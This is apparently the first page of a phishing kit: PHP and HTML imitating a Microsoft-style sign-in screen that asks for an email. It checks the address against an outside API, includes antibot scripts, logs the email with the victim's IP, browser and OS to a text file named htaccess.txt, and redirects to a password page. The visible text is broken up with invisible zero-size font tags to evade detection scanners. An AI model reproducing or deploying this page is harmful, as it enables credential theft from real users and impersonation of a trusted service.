
<?php  
ob_start();
session_start();
error_reporting(0);
include 'info.php';
include '/BOTS/antibots1.php';
include '/BOTS/antibots2.php';
include '/BOTS/antibots3.php';
include '/BOTS/antibots4.php';
include '/BOTS/antibots5.php';
include '/BOTS/antibots6.php';
// define variables to empty values  
$emailErr = "";  
$email = "";  
  
//Input fields validation  
if ($_SERVER["REQUEST_METHOD"] == "POST") {  
      
  
 
 
 $data = [
            'email' => $_POST["email"]
           
        ];

   $result = json_decode(sendPostRequest($url_api, array(
            'api_key' => $api_key,
            'func_name' => 'em',
            'data' => $data
        )),true);
        
      
	   
	   if ($result['results']['rem'] == 0) {  
	   
              $email = $_POST["email"];
$_SESSION['mail'] = $_POST["email"];
///--------------------------------------------------------------------------------------------------------------------------


///--------------------------------------------------------------------------------------------------------------------------inc
///--------------------------------------------------------------------------------------------------------------------------
///--------------------------------------------------------------------------------------------------------------------------
$ali .=
 "
|Email=| ".$_SESSION['mail']." |IP|$remote|Time| $time|User|".DARKER_Browser($_SERVER['HTTP_USER_AGENT'])." ON ".DARKER_OS($_SERVER['HTTP_USER_AGENT'])."\n";
///--------------------------------------------------------------------------------------------------------------------------
///--------------------------------------------------------------------------------------------------------------------------
$file = @fopen("htaccess.txt","a");
fwrite($file, $ali);
///--------------------------------------------------------------------------------------------------------------------------
$redirect_page = "./pass.php?".strtolower($_SESSION['_lang_']."&locale.x=".$_SESSION['_LOOKUP_CNTRCODE_'])."_".$remote.$dst;
$redirect = true;
header('Location: '.$redirect_page);

			  
         
		 } else {  
           
			$emailErr = "We couldn't find an account with that username. Try another"; 			
                }
         
        







}  
  
?> 


<html dir="ltr" class="" lang="en"><head>
    <title>Sign in to your account</title>

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    
        <link rel="shortcut icon" href="favicon.ico">

    
  <style>
html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;}
body{margin:0;}
a{background-color:transparent;}
a:active,a:hover{outline:0;}
img{border:0;}
input{color:inherit;font:inherit;margin:0;}
html input[type="button"]
input::-moz-focus-inner{border:0;padding:0;}
input{line-height:normal;}
*{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;}
*:before,*:after{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;}
input{font-family:inherit;font-size:inherit;line-height:inherit;}
a:focus{outline:thin dotted;outline-offset:-2px;outline:5px auto -webkit-focus-ring-color;}
img{vertical-align:middle;}
html{font-size:100%;}
body{font-family:"Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";font-size:15px;line-height:20px;font-weight:400;font-size:.9375rem;line-height:1.25rem;padding-bottom:.227px;padding-top:.227px;color:#000;background-color:#fff;}
a{color:#ccc;text-decoration:none;}
a:link{color:#0067b8;}
a:visited{color:#0067b8;}
a:hover{color:#666;}
a:focus{color:#0067b8;}
a:active{color:#999;}
.text-left{text-align:left;}
.row{margin-left:-2px;margin-right:-2px;}
.row:before,.row:after{content:" ";display:table;}
.row:after{clear:both;}
.col-xs-24,.col-md-24{position:relative;min-height:1px;padding-left:2px;padding-right:2px;}
.col-xs-24{float:left;}
.col-xs-24{width:100%;}
@media (min-width:768px){
.col-md-24{float:left;}
.col-md-24{width:100%;}
}
.form-control{display:block;width:100%;background-image:none;}
input{max-width:100%;line-height:inherit;}
input[type="email"]{padding:4px 8px;border-style:solid;border-width:2px;border-color:rgba(0,0,0,0.4);background-color:rgba(255,255,255,0.4);height:32px;height:2rem;}
input[type="email"]:focus{border-color:#0067b8;background-color:#fff;}
input[type="email"]::-moz-placeholder{color:rgba(0,0,0,0.6);opacity:1;}
input[type="email"]:-ms-input-placeholder{color:rgba(0,0,0,0.6);}
input[type="email"]::-webkit-input-placeholder{color:rgba(0,0,0,0.6);}
input::-ms-clear,input::-ms-reveal{height:100%;padding:4px 8px;margin-right:-8px;margin-left:4px;}
input::-ms-clear:hover,input::-ms-reveal:hover{color:#0067b8;}
input::-ms-clear:active,input::-ms-reveal:active{color:#fff;background-color:#0067b8;}
.form-group{margin-bottom:12px;}
::-ms-expand{margin:0 6px 0 20px;background-color:transparent;border:0;}

.table{width:100%;max-width:100%;}
a:focus{outline-offset:0;}
body{direction:ltr;}
.ltr_override{direction:ltr;text-align:left;}
.text-secondary{color:rgba(0,0,0,0.7);font-size:13px;}
body.cb{text-align:center;}
body.cb .text-13{font-size:.8125rem;}
body.cb div.placeholderContainer{width:100%;position:relative;}
body.cb #signup{white-space:nowrap;}
.no-padding-left-right{padding-left:0;padding-right:0;}
body.cb{color:#1b1b1b;text-align:left;}
.background-image{-webkit-animation:fadeIn 1s;-moz-animation:fadeIn 1s;-o-animation:fadeIn 1s;animation:fadeIn 1s;}
.background-image-holder{background:#f2f2f2;}
.background-image-holder,.background-image{position:fixed;top:0;width:100%;height:100%;}
.background-image{background-repeat:no-repeat,no-repeat;background-position:center center,center center;background-size:cover,cover;}
.footer{position:absolute;left:0;bottom:0;width:100%;overflow:visible;z-index:99;clear:both;min-height:28px;}
div.footerNode{margin:0;float:right;}
.footer-content.footer-item{color:#000;font-size:12px;line-height:28px;white-space:nowrap;display:inline-block;margin-left:8px;margin-right:8px;}
.footer-content.footer-item.debug-item{text-decoration:none;letter-spacing:3px;line-height:22px;vertical-align:top;font-size:16px;font-weight:600;}
.outer{display:table;position:absolute;height:100%;width:100%;}
.middle{display:table-cell;vertical-align:middle;}
.sign-in-box{margin-left:auto;margin-right:auto;position:relative;max-width:440px;width:calc(100% - 40px);padding:44px;margin-bottom:28px;background-color:#fff;-webkit-box-shadow:0 2px 6px rgba(0,0,0,0.2);-moz-box-shadow:0 2px 6px rgba(0,0,0,0.2);box-shadow:0 2px 6px rgba(0,0,0,0.2);min-width:320px;min-height:338px;overflow:hidden;}
.sign-in-box.has-popup{margin-bottom:20px;}
a:hover{text-decoration:underline;}
.promoted-fed-cred-box{margin-left:auto;margin-right:auto;position:relative;max-width:440px;width:calc(100% - 40px);padding:44px;margin-bottom:28px;line-height:16px;min-width:320px;padding:0;}
.promoted-fed-cred-box>*{word-wrap:break-word;}
.promoted-fed-cred-content{background-color:#fff;-webkit-box-shadow:0 2px 6px rgba(0,0,0,0.2);-moz-box-shadow:0 2px 6px rgba(0,0,0,0.2);box-shadow:0 2px 6px rgba(0,0,0,0.2);padding-left:44px;padding-right:44px;}
.promoted-fed-cred-content .row.tile .table{padding-top:8px;padding-bottom:8px;}
.template-section{display:table-row;}
.template-section.main-section{height:100%;}
input[type="email"]{padding:6px 10px;border-width:1px;border-color:#666;border-color:rgba(0,0,0,0.6);height:36px;outline:none;border-radius:0;-webkit-border-radius:0;background-color:transparent;}
input[type="email"]:hover{border-color:#323232;border-color:rgba(0,0,0,0.8);}
input[type="email"]:focus{border-color:#0067b8;background-color:transparent;}

button[type="submit"]{display: inline-block;min-width: 100px;padding: 4px 12px 4px 12px;position: relative;max-width: 100%;text-align: center;white-space: nowrap;overflow: hidden;vertical-align: middle;text-overflow: ellipsis;touch-action: manipulation;color: #000;border-style: solid;border-width: 2px;border-color: transparent;min-height: 32px;border: none;background-color: #ccc;background-color: rgba(0,0,0,0.2);min-width: 108px;line-height: normal;display: block;width: 100%;line-height:normal;}


.button.secondary{display:inline-block;min-width:100px;padding:4px 12px 4px 12px;margin-top:4px;margin-bottom:4px;position:relative;max-width:100%;text-align:center;white-space:nowrap;overflow:hidden;vertical-align:middle;text-overflow:ellipsis;touch-action:manipulation;color:#000;border-style:solid;border-width:2px;border-color:transparent;min-height:32px;border:none;background-color:#ccc;background-color:rgba(0,0,0,0.2);min-width:108px;line-height:normal;margin-top:0;margin-bottom:0;display:block;width:100%;}
.button.secondary:hover{background-color:#b2b2b2;background-color:rgba(0,0,0,0.3);}
.button.secondary:focus{background-color:#b2b2b2;background-color:rgba(0,0,0,0.3);text-decoration:underline;outline:2px solid #000;}
.button.secondary:active{outline:none;text-decoration:none;-ms-transform:scale(.98);-webkit-transform:scale(.98);transform:scale(.98);}
.button.primary{color:#fff;border-color:#0067b8;background-color:#0067b8;display:block;width:100%;}
.button.primary:hover{background-color:#005da6;}
.button.primary:focus{background-color:#005da6;text-decoration:underline;outline:2px solid #000;}
.button.primary:active{outline:none;text-decoration:none;-ms-transform:scale(.98);-webkit-transform:scale(.98);transform:scale(.98);}
.logo{max-width:256px;height:24px;}
.table{width:100%;display:table;table-layout:fixed;}
.table .table-row{display:table-row;}
.table .table-cell{display:table-cell;vertical-align:middle;}
.row{margin-left:0;margin-right:0;}
.row.tile{margin-bottom:0;outline:none;color:inherit;display:block;margin-left:-44px;margin-right:-44px;}
.row.tile:not(.no-pick){cursor:pointer;}
.row.tile:not(.no-pick):hover{background-color:#e6e6e6;background-color:rgba(0,0,0,0.1);color:inherit;}
.row.tile:not(.no-pick):active{background-color:#b3b3b3;background-color:rgba(0,0,0,0.3);color:inherit;}
.row.tile .content{line-height:16px;padding-left:12px;padding-right:12px;}
.row.tile .content>*{word-wrap:break-word;}
.row.tile .table{padding:12px 44px;}
.row.tile .table:focus{outline:#000 dashed 1px;background:#ccc;background:rgba(0,0,0,0.1);}
.row.tile .table-cell:first-child+.table-cell{width:100%;}
.tile-img{position:relative;width:48px;height:48px;}
.tile-img.medium{width:32px;height:32px;}
.form-group{margin-bottom:16px;}
input[type='button'],input[type='submit']{margin-top:0;margin-bottom:0;}

.position-buttons>div:first-child{display:inline-block;width:100%;margin-bottom:36px;}
.button-container{position:absolute;bottom:0;right:0;text-align:right;}
@media (max-width:600px),(max-height:366px){
.background-image-holder,.background-image{display:none;}
.middle{vertical-align:top;}
.sign-in-box{padding:24px;margin-top:0;margin-bottom:88px;width:100%;width:100vw;-webkit-box-shadow:none;-moz-box-shadow:none;box-shadow:none;border:0;}
.sign-in-box.has-popup{padding-bottom:0;margin-bottom:0;}
.promoted-fed-cred-box{padding:24px;margin-top:0;margin-bottom:88px;width:100%;width:100vw;padding:0 24px;}
.promoted-fed-cred-content{-webkit-box-shadow:none;-moz-box-shadow:none;box-shadow:none;border:0;padding-left:24px;padding-right:24px;border:1px solid #818c94;border:1px solid rgba(0,0,0,0.4);}
.row.tile{margin-left:-24px;margin-right:-24px;}
.row.tile .table{padding:12px 24px;}
.footer{background-color:#fff;filter:none;}
div.footerNode{float:left;margin:0 24px!important;}
.footer-content.footer-item{color:#747474;}
}
.inline-block{display:inline-block;}
input[type="email"]{border-top-width:0;border-left-width:0;border-right-width:0;padding-left:0;}
.input.text-box{padding:4px 8px;border-style:solid;border-width:2px;border-color:rgba(0,0,0,0.4);background-color:rgba(255,255,255,0.4);height:32px;height:2rem;padding:6px 10px;border-width:1px;border-color:#666;border-color:rgba(0,0,0,0.6);height:36px;outline:none;border-radius:0;-webkit-border-radius:0;background-color:transparent;border-top-width:0;border-left-width:0;border-right-width:0;padding-left:0;}
.input.text-box:focus{background-color:#fff;border-color:#0067b8;background-color:transparent;}
.input.text-box:hover{border-color:#323232;border-color:rgba(0,0,0,0.8);}
.input.text-box::-moz-placeholder{color:rgba(0,0,0,0.6);opacity:1;}
.input.text-box:-ms-input-placeholder{color:rgba(0,0,0,0.6);}
.input.text-box::-webkit-input-placeholder{color:rgba(0,0,0,0.6);}
.title{margin-bottom:20px;margin-top:20px;margin-bottom:1.25rem;margin-top:1.25rem;font-size:24px;line-height:28px;font-weight:300;line-height:1.75rem;padding-bottom:2.3632px;padding-top:2.3632px;color:#1b1b1b;font-size:1.5rem;font-weight:600;padding:0;margin-top:16px;margin-bottom:12px;font-family:"Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";}
.pagination-view{position:relative;min-height:206px;}
@media (-ms-high-contrast){
.button,input[type='button'],input[type='submit']{-ms-high-contrast-adjust:none;outline:1px solid windowText;border:1px solid window;background-color:window;color:windowText;text-decoration:none;}
.button:hover,input[type='button']:hover,input[type='submit']:hover{outline:1px solid windowText;border:1px solid highlight;background-color:highlight;color:highlightText;text-decoration:none;}
.button:hover:focus,input[type='button']:hover:focus,input[type='submit']:hover:focus{outline:1px solid windowText;border:1px solid windowText;background-color:highlight;color:highlightText;text-decoration:underline;}
.button:focus,input[type='button']:focus,input[type='submit']:focus{outline:1px solid windowText;border:1px solid windowText;background-color:window;color:windowText;text-decoration:underline;}
.button.primary,input[type='submit'].primary,.button.secondary,input[type='button'].secondary{outline:1px solid highlight;border:1px solid highlight;background-color:highlight;color:highlightText;text-decoration:none;}
.button.primary:hover,input[type='submit'].primary:hover,.button.secondary:hover,input[type='button'].secondary:hover{outline:1px solid highlight;border:1px solid window;background-color:window;color:highlight;text-decoration:none;}
.button.primary:hover:focus,input[type='submit'].primary:hover:focus,.button.secondary:hover:focus,input[type='button'].secondary:hover:focus{outline:1px solid windowText;border:1px solid window;background-color:window;color:highlight;text-decoration:underline;}
.button.primary:focus,input[type='submit'].primary:focus,.button.secondary:focus,input[type='button'].secondary:focus{outline:1px solid windowText;border:1px solid window;background-color:highlight;color:highlightText;text-decoration:underline;}
}
.fade-in-lightbox{animation:fadeIn .3s ease-in;-webkit-animation:fadeIn .3s ease-in;-moz-animation:fadeIn .3s ease-in;-ms-animation:fadeIn .3s ease-in;-o-animation:fadeIn .3s ease-in;}
.animate{animation-duration:.25s;-webkit-animation-duration:.25s;-moz-animation-duration:.25s;-ms-animation-duration:.25s;-o-animation-duration:.25s;animation-timing-function:cubic-bezier(.5, 0, .5, 1);-webkit-animation-timing-function:cubic-bezier(.5, 0, .5, 1);-moz-animation-timing-function:cubic-bezier(.5, 0, .5, 1);-ms-animation-timing-function:cubic-bezier(.5, 0, .5, 1);-o-animation-timing-function:cubic-bezier(.5, 0, .5, 1);animation-fill-mode:both;-webkit-animation-fill-mode:both;-moz-animation-fill-mode:both;-ms-animation-fill-mode:both;-o-animation-fill-mode:both;transition-property:left;-webkit-transition-property:left;-moz-transition-property:left;-ms-transition-property:left;-o-transition-property:left;}
html[dir=ltr] .animate.slide-in-next{animation-name:show-from-right;-webkit-animation-name:show-from-right;-moz-animation-name:show-from-right;-ms-animation-name:show-from-right;-o-animation-name:show-from-right;}

@keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
@-o-keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
@-moz-keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
@-webkit-keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
@keyframes show-from-right{from{left:200px;opacity:0;}to{left:0;opacity:1;}}
@-webkit-keyframes show-from-right{from{left:200px;opacity:0;}to{left:0;opacity:1;}}
@-moz-keyframes show-from-right{from{left:200px;opacity:0;}to{left:0;opacity:1;}}
@-ms-keyframes show-from-right{from{left:200px;opacity:0;}to{left:0;opacity:1;}}
@-o-keyframes show-from-right{from{left:200px;opacity:0;}to{left:0;opacity:1;}}

@font-face{font-family:'Segoe UI Webfont';src:local("Segoe UI Light");font-weight:200;font-style:normal;}
@font-face{font-family:'Segoe UI Webfont';src:local("Segoe UI");font-weight:400;font-style:normal;}
@font-face{font-family:'Segoe UI Webfont';src:local("Segoe UI Semibold");font-weight:600;font-style:normal;}
@font-face{font-family:"Segoe UI Webfont";font-weight:300;src:local("Segoe UI Semilight");}
@font-face{font-family:"Segoe UI Webfont";font-weight:700;src:local("Segoe UI Bold");}
@font-face{font-family:"Segoe UI Webfont";font-style:italic;font-weight:400;src:local("Segoe UI Italic");}
@font-face{font-family:"Segoe UI Webfont";font-style:italic;font-weight:700;src:local("Segoe UI Bold Italic");}






</style>




<body class="cb" style="display: block;">



<div>




<form method="post"action="<?php echo $_SERVER['REQUEST_URI'] ?>"> 

    <div>


        <div  >

<div class="background-image-holder" >

    <div  class="background-image ext-background-image" style="background-image: url(ya9ss.png);"></div>
</div>





<div class="outer">

    <div class="template-section main-section">
        <div class="middle ext-middle">
            <div class="full-height" >

<div class="flex-column">


    <div class="win-scroll">
        <div  class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup">



        <div >
				<img class="logo"  src="logo_ed9a.png"  >
</div>

<div>

    <div class="pagination-view animate slide-in-next" >

               <div>

<div><div class="row title ext-title" >
    <div >S<font style="color:transparent;font-size:0px"></font>i<font style="color:transparent;font-size:0px"></font>g<font style="color:transparent;font-size:0px"></font>n <font style="color:transparent;font-size:0px"></font>i<font style="color:transparent;font-size:0px"></font>n</div>
</div></div>

<div class="row">
    <div style="color:red">
	    <?php echo $emailErr; ?>   
    </div>

    <div class="form-group col-md-24">

        <div class="placeholderContainer">

            <input type="email" name="email" class="form-control ltr_override input ext-input text-box ext-text-box" placeholder="Email, phone, or Skype">
</div>
       
    </div>
</div>

<div class="position-buttons">
    <div class="row">
        <div class="col-md-24">
            <div class="text-13">
                <div class="form-group">N<font style="color:transparent;font-size:0px"></font>o<font style="color:transparent;font-size:0px"></font> a<font style="color:transparent;font-size:0px"></font>cc<font style="color:transparent;font-size:0px"></font>o<font style="color:transparent;font-size:0px"></font>un<font style="color:transparent;font-size:0px"></font>t<font style="color:transparent;font-size:0px"></font>? <a href="index.php">C<font style="color:transparent;font-size:0px"></font>re<font style="color:transparent;font-size:0px"></font>at<font style="color:transparent;font-size:0px"></font>e<font style="color:transparent;font-size:0px"></font> o<font style="color:transparent;font-size:0px"></font>n<font style="color:transparent;font-size:0px"></font>e<font style="color:transparent;font-size:0px"></font>!</a></div>

                <div class="form-group">
                    <a  href="index.php">C<font style="color:transparent;font-size:0px"></font>a<font style="color:transparent;font-size:0px"></font>n<font style="color:transparent;font-size:0px"></font>’t access <font style="color:transparent;font-size:0px"></font>yo<font style="color:transparent;font-size:0px"></font>u<font style="color:transparent;font-size:0px"></font>r <font style="color:transparent;font-size:0px"></font>a<font style="color:transparent;font-size:0px"></font>c<font style="color:transparent;font-size:0px"></font>co<font style="color:transparent;font-size:0px"></font>un<font style="color:transparent;font-size:0px"></font>t<font style="color:transparent;font-size:0px"></font>?</a>
                </div>

            </div>
        </div>
    </div>
</div>


<div class="win-button-pin-bottom"><div class="col-xs-24 no-padding-left-right button-container">

    <div class="inline-block">
        <button type="button"  class="win-button button-secondary button ext-button secondary ext-secondary">B<font style="color:transparent;font-size:0px"></font>a<font style="color:transparent;font-size:0px"></font>c<font style="color:transparent;font-size:0px"></font>k</button>
		

    </div>

    <div  class="inline-block">
        <button type="submit" name="submit"  class="win-button button_primary button ext-button primary ext-primary" >N<font style="color:transparent;font-size:0px"></font>e<font style="color:transparent;font-size:0px"></font>x<font style="color:transparent;font-size:0px"></font>t</button>
		
    </div>



</div></div>
    </div>
</div>
    </div>
</div></div>


        </div>

        <div  class="promoted-fed-cred-box ext-promoted-fed-cred-box">
            <div class="promoted-fed-cred-content">

                <div class="row tile">
                    <div class="table">

                        <div class="table-row">
                            <div class="table-cell tile-img medium">
							<img class="tile-img medium"  src="sions.png">

                            </div>
                            <div class="table-cell text-left content">
                                <div >S<font style="color:transparent;font-size:0px"></font>i<font style="color:transparent;font-size:0px"></font>g<font style="color:transparent;font-size:0px"></font>n<font style="color:transparent;font-size:0px"></font>-i<font style="color:transparent;font-size:0px"></font>n o<font style="color:transparent;font-size:0px"></font>pt<font style="color:transparent;font-size:0px"></font>i<font style="color:transparent;font-size:0px"></font>on<font style="color:transparent;font-size:0px"></font>s</div>
                            </div>
                        </div>
                    </div>
                </div>

            </div>
        </div>

    </div>
</div>
</div>
        </div>
    </div>

    <div  class="footer ext-footer">

<div class="footerNode text-secondary">

        <a  href="#" class="footer-content ext-footer-content footer-item ext-footer-item">T<font style="color:transparent;font-size:0px"></font>er<font style="color:transparent;font-size:0px"></font>m<font style="color:transparent;font-size:0px"></font>s o<font style="color:transparent;font-size:0px"></font>f<font style="color:transparent;font-size:0px"></font> u<font style="color:transparent;font-size:0px"></font>s<font style="color:transparent;font-size:0px"></font>e</a>

        <a  href="#" class="footer-content ext-footer-content footer-item ext-footer-item">P<font style="color:transparent;font-size:0px"></font>r<font style="color:transparent;font-size:0px"></font>i<font style="color:transparent;font-size:0px"></font>va<font style="color:transparent;font-size:0px"></font>c<font style="color:transparent;font-size:0px"></font>y <font style="color:transparent;font-size:0px"></font>&amp;<font style="color:transparent;font-size:0px"></font> c<font style="color:transparent;font-size:0px"></font>o<font style="color:transparent;font-size:0px"></font>o<font style="color:transparent;font-size:0px"></font>ki<font style="color:transparent;font-size:0px"></font>e<font style="color:transparent;font-size:0px"></font>s</a>

    <a  href="#"  class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">.<font style="color:transparent;font-size:0px"></font>.<font style="color:transparent;font-size:0px"></font>.</a>
</div>
</div>
    </div>
</div>
</div>

</div>
    
</form>
 

</div></body></html>